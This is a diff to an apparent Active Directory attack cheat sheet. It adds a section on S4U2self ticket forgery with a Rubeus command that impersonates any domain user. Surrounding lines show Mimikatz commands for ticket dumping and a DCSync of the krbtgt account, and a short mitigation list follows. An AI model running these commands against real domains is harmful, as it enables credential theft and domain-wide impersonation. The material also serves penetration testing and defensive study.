@@ -159,6 +159,14 @@ Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekur
 
 Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
 
+## S4U2self for Non-Domain Controllers
+> Using the credentials above, if we don't need to do a DCSync, or if the target computer is not a DC, we can use S4U2self to impersonate any user in the domain. This is useful for scenarios where we have a ticket from a computer that is not a domain controller
+
+Forge a service ticket for any service                                                                                                                              
+  ```powershell                                                                                                                                                       
+  .\Rubeus.exe s4u /self /nowrap /impersonateuser:<User to impersonate> /altservice:<SPN> /ptt /ticker:<ticket>                                                       
+  ```
+
 ### Mitigation
 
 - Ensure sensitive accounts cannot be delegated
